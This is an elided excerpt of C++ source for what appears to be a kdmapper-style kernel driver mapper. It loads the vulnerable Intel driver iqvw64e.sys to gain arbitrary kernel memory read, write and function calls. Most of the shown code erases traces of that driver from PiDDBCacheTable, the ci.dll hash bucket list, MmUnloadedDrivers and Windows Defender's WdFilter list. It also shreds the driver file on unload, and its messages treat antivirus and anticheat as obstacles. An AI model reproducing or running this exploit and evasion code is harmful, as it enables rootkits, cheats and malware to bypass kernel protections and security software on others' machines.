...
HANDLE intel_driver::Load() {
	...
	if (intel_driver::IsRunning()) {
		FuckOff(L"[-] \\Device\\Nal is already in use." << std::endl);
	...
	FuckOff(L"[<] Loading vulnerable driver, Name: " << GetDriverNameW() << std::endl);

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		FuckOff(L"[-] Can't find TEMP folder" << std::endl);
		return INVALID_HANDLE_VALUE;
	}
	...
	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
		FuckOff(L"[-] Failed to create vulnerable driver file" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	if (!service::RegisterAndStart(driver_path)) {
		FuckOff(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
		_wremove(driver_path.c_str());
		return INVALID_HANDLE_VALUE;
	}
	...
	{
		FuckOff(L"[-] Failed to load driver iqvw64e.sys" << std::endl);
	...
	if (ntoskrnlAddr == 0) {
		FuckOff(L"[-] Failed to get ntoskrnl.exe" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
	...
	if (!intel_driver::ReadMemory(result, intel_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
		FuckOff(L"[-] Can't exploit intel driver, is there any antivirus or anticheat running?" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearPiDDBCacheTable(result)) {
		FuckOff(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearKernelHashBucketList(result)) {
		FuckOff(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearMmUnloadedDrivers(result)) {
		FuckOff(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	if (!intel_driver::ClearWdFilterDriverList(result)) {
		FuckOff("[!] Failed to ClearWdFilterDriverList" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
...
bool intel_driver::ClearWdFilterDriverList(HANDLE device_handle) {
	...
	if (!WdFilter) {
		FuckOff("[+] WdFilter.sys not loaded, clear skipped" << std::endl);
		return true;
	}
	...
	if (!RuntimeDriversList) {
		FuckOff("[!] Failed to find WdFilter RuntimeDriversList" << std::endl);
		return false;
	}
	...
	if (!RuntimeDriversCountRef) {
		FuckOff("[!] Failed to find WdFilter RuntimeDriversCount" << std::endl);
		return false;
	}
	...
	*/
	...
	if (!MpFreeDriverInfoExRef) {
		...
		*/
		...
		if (!MpFreeDriverInfoExRef) {
			FuckOff("[!] Failed to find WdFilter MpFreeDriverInfoEx" << std::endl);
			return false;
		}
		else {
			FuckOff("[+] Found WdFilter MpFreeDriverInfoEx with second pattern" << std::endl);
		}
			...
			if (ReadMemory(device_handle, (uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
				if (wcsstr(ImageName.get(), intel_driver::GetDriverNameW().c_str())) {
					...
					if (!removedRuntimeDriversArray) {
						FuckOff("[!] Failed to remove from RuntimeDriversArray" << std::endl);
						return false;
					}
					...
					if (Magic != 0xDA18) {
						FuckOff("[!] DriverInfo Magic is invalid, new wdfilter version?, driver info will not be released to prevent bsod" << std::endl);
					}
					else {
						CallKernelFunction<void>(device_handle, nullptr, MpFreeDriverInfoEx, DriverInfo);
					}

					FuckOff("[+] WdFilterDriverList Cleaned: " << ImageName << std::endl);
					return true;
				}
			}
		}
...
bool intel_driver::Unload(HANDLE device_handle) {
	FuckOff(L"[<] Unloading vulnerable driver" << std::endl);
	...
	if (!file_ofstream.write((char*)randomData, newFileLen)) {
		FuckOff(L"[!] Error dumping shit inside the disk" << std::endl);
	}
	else {
		FuckOff(L"[+] Vul driver data destroyed before unlink" << std::endl);
	}
	file_ofstream.close();
	delete[] randomData;
...
bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t Address, void* buffer, uint32_t size) {
	...
	if (!GetPhysicalAddress(device_handle, Address, &physical_address)) {
		FuckOff(L"[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(Address) << std::endl);
		return false;
	}
	...
	if (!mapped_physical_memory) {
		FuckOff(L"[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
		return false;
	}
	...
	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
		FuckOff(L"[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
#endif
...
uint64_t intel_driver::MmAllocateIndependentPagesEx(HANDLE device_handle, uint32_t size)
{
	...
	if (!kernel_MmAllocateIndependentPagesEx)
	{
		...
		if (!kernel_MmAllocateIndependentPagesEx) {
			FuckOff(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}
...
bool intel_driver::MmFreeIndependentPages(HANDLE device_handle, uint64_t Address, uint32_t size)
{
	...
	if (!kernel_MmFreeIndependentPages)
	{
		...
		if (!kernel_MmFreeIndependentPages) {
			FuckOff(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
			return false;
		}
...
BOOLEAN intel_driver::MmSetPageProtection(HANDLE device_handle, uint64_t Address, uint32_t size, ULONG new_protect)
{
	if (!Address)
	{
		FuckOff(L"[!] Invalid address passed to MmSetPageProtection" << std::endl);
		return FALSE;
	}
	...
	if (!kernel_MmSetPageProtection)
	{
		...
		if (!kernel_MmSetPageProtection) {
			FuckOff(L"[!] Failed to find MmSetPageProtection" << std::endl);
			return FALSE;
		}
...
uint64_t intel_driver::MmAllocatePagesForMdl(HANDLE device_handle, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes)
{
	...
	{
		FuckOff(L"[!] Failed to find MmAlocatePagesForMdl" << std::endl);
		return 0;
	}
...
uint64_t intel_driver::MmMapLockedPagesSpecifyCache(HANDLE device_handle, uint64_t pmdl, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, uint64_t RequestedAddress, ULONG BugCheckOnFailure, ULONG Priority)
{
	...
	{
		FuckOff(L"[!] Failed to find MmMapLockedPagesSpecifyCache" << std::endl);
		return 0;
	}
...
bool intel_driver::MmProtectMdlSystemAddress(HANDLE device_handle, uint64_t MemoryDescriptorList, ULONG NewProtect)
{
	...
	{
		FuckOff(L"[!] Failed to find MmProtectMdlSystemAddress" << std::endl);
		return 0;
	}
...
bool intel_driver::MmUnmapLockedPages(HANDLE device_handle, uint64_t BaseAddress, uint64_t pmdl)
{
	...
	{
		FuckOff(L"[!] Failed to find MmUnmapLockedPages" << std::endl);
		return 0;
	}
...
bool intel_driver::MmFreePagesFromMdl(HANDLE device_handle, uint64_t MemoryDescriptorList)
{
	...
	{
		FuckOff(L"[!] Failed to find MmFreePagesFromMdl" << std::endl);
		return 0;
	}
...
uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size) {
	...
	if (!kernel_ExAllocatePool) {
		FuckOff(L"[!] Failed to find ExAllocatePool" << std::endl);
		return 0;
	}
...
bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle) {
	...
	if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
		FuckOff(L"[!] Failed to find device_object" << std::endl);
		return false;
	}
	...
	if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
		FuckOff(L"[!] Failed to find driver_object" << std::endl);
		return false;
	}
	...
	if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
		FuckOff(L"[!] Failed to find driver_section" << std::endl);
		return false;
	}
	...
	if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		FuckOff(L"[!] Failed to find driver name" << std::endl);
		return false;
	}
	...
	if (!ReadMemory(device_handle, (uintptr_t)us_driver_base_dll_name.Buffer, unloadedName.get(), us_driver_base_dll_name.Length)) {
		FuckOff(L"[!] Failed to read driver name" << std::endl);
		return false;
	}
	...
	if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		FuckOff(L"[!] Failed to write driver name length" << std::endl);
		return false;
	}

	FuckOff(L"[+] MmUnloadedDrivers Cleaned: " << unloadedName << std::endl);
	return true;
}
...
bool intel_driver::ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait) {
	...
	if (!kernel_ExAcquireResourceExclusiveLite) {
		FuckOff(L"[!] Failed to find ExAcquireResourceExclusiveLite" << std::endl);
		return 0;
	}
...
bool intel_driver::ExReleaseResourceLite(HANDLE device_handle, PVOID Resource) {
	...
	if (!kernel_ExReleaseResourceLite) {
		FuckOff(L"[!] Failed to find ExReleaseResourceLite" << std::endl);
		return false;
	}
...
BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer) {
	...
	if (!kernel_RtlDeleteElementGenericTableAvl) {
		FuckOff(L"[!] Failed to find RtlDeleteElementGenericTableAvl" << std::endl);
		return false;
	}
...
PVOID intel_driver::RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer) {
	...
	if (!kernel_RtlDeleteElementGenericTableAvl) {
		FuckOff(L"[!] Failed to find RtlLookupElementGenericTableAvl" << std::endl);
		return nullptr;
	}
...
bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTable added on LoadDriver
	...
	if (PiDDBLockPtr == NULL) { // PiDDBLock pattern changes a lot from version 1607 of windows and we will need a second pattern if we want to keep simple as posible
		...
		if (PiDDBLockPtr == NULL) {
			FuckOff(L"[-] Warning PiDDBLock not found" << std::endl);
			return false;
		}
		FuckOff(L"[+] PiDDBLock found with second pattern" << std::endl);
	...
	if (PiDDBCacheTablePtr == NULL) {
		FuckOff(L"[-] Warning PiDDBCacheTable not found" << std::endl);
		return false;
	}

	FuckOff("[+] PiDDBLock Ptr 0x" << std::hex << PiDDBLockPtr << std::endl);
	FuckOff("[+] PiDDBCacheTable Ptr 0x" << std::hex << PiDDBCacheTablePtr << std::endl);
	...
	if (!ExAcquireResourceExclusiveLite(device_handle, PiDDBLock, true)) {
		FuckOff(L"[-] Can't lock PiDDBCacheTable" << std::endl);
		return false;
	}
	FuckOff(L"[+] PiDDBLock Locked" << std::endl);
	...
	if (pFoundEntry == nullptr) {
		FuckOff(L"[-] Not found in cache" << std::endl);
	...
	if (!RtlDeleteElementGenericTableAvl(device_handle, PiDDBCacheTable, pFoundEntry)) {
		FuckOff(L"[-] Can't delete from PiDDBCacheTable" << std::endl);
		ExReleaseResourceLite(device_handle, PiDDBLock);
		return false;
	}
	...
	FuckOff(L"[+] PiDDBCacheTable Cleaned" << std::endl);
...
uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	if (!dwAddress) {
		FuckOff(L"[-] No module address to find pattern" << std::endl);
		return 0;
	}

	if (dwLen > 1024 * 1024 * 1024) { //if read is > 1GB
		FuckOff(L"[-] Can't find pattern, Too big section" << std::endl);
		return 0;
	}

	auto sectionData = std::make_unique<BYTE[]>(dwLen);
	if (!ReadMemory(device_handle, dwAddress, sectionData.get(), dwLen)) {
		FuckOff(L"[-] Read failed in FindPatternAtKernel" << std::endl);
		return 0;
	}
...
bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
	...
	if (!ci) {
		FuckOff(L"[-] Can't Find ci.dll module address" << std::endl);
		return false;
	}
	...
	if (!sig) {
		FuckOff(L"[-] Can't Find g_KernelHashBucketList" << std::endl);
		return false;
	}
	auto sig2 = FindPatternAtKernel(device_handle, (uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), "xxx");
	if (!sig2) {
		FuckOff(L"[-] Can't Find g_HashCacheLock" << std::endl);
		return false;
	}
	...
	{
		FuckOff(L"[-] Can't Find g_HashCache relative address" << std::endl);
		return false;
	}

	FuckOff(L"[+] g_KernelHashBucketList Found 0x" << std::hex << g_KernelHashBucketList << std::endl);

	if (!ExAcquireResourceExclusiveLite(device_handle, g_HashCacheLock, true)) {
		FuckOff(L"[-] Can't lock g_HashCacheLock" << std::endl);
		return false;
	}
	FuckOff(L"[+] g_HashCacheLock Locked" << std::endl);
	...
	if (!ReadMemory(device_handle, (uintptr_t)prev, &entry, sizeof(entry))) {
		FuckOff(L"[-] Failed to read first g_KernelHashBucketList entry!" << std::endl);
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			FuckOff(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return false;
	}
	if (!entry) {
		FuckOff(L"[!] g_KernelHashBucketList looks empty!" << std::endl);
		if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
			FuckOff(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return true;
	...
	while (entry) {
		...
		if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen)) || wsNameLen == 0) {
			FuckOff(L"[-] Failed to read g_KernelHashBucketList entry text len!" << std::endl);
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				FuckOff(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
		...
		if (expected_len == wsNameLen) {
			...
			if (!ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr)) || !wsNamePtr) {
				FuckOff(L"[-] Failed to read g_KernelHashBucketList entry text ptr!" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					FuckOff(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			...
			if (!ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName.get(), wsNameLen)) {
				FuckOff(L"[-] Failed to read g_KernelHashBucketList entry text!" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					FuckOff(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
				}
				return false;
			...
			if (find_result != std::wstring::npos) {
				FuckOff(L"[+] Found In g_KernelHashBucketList: " << std::wstring(&wsName[find_result]) << std::endl);
				HashBucketEntry* Next = 0;
				if (!ReadMemory(device_handle, (uintptr_t)entry, &Next, sizeof(Next))) {
					FuckOff(L"[-] Failed to read g_KernelHashBucketList next entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						FuckOff(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				...
				if (!WriteMemory(device_handle, (uintptr_t)prev, &Next, sizeof(Next))) {
					FuckOff(L"[-] Failed to write g_KernelHashBucketList prev entry ptr!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						FuckOff(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				...
				if (!FreePool(device_handle, (uintptr_t)entry)) {
					FuckOff(L"[-] Failed to clear g_KernelHashBucketList entry pool!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						FuckOff(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					}
					return false;
				}
				FuckOff(L"[+] g_KernelHashBucketList Cleaned" << std::endl);
				if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
					FuckOff(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
					if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
						FuckOff(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		...
		if (!ReadMemory(device_handle, (uintptr_t)entry, &entry, sizeof(entry))) {
			FuckOff(L"[-] Failed to read g_KernelHashBucketList next entry!" << std::endl);
			if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
				FuckOff(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
			}
			return false;
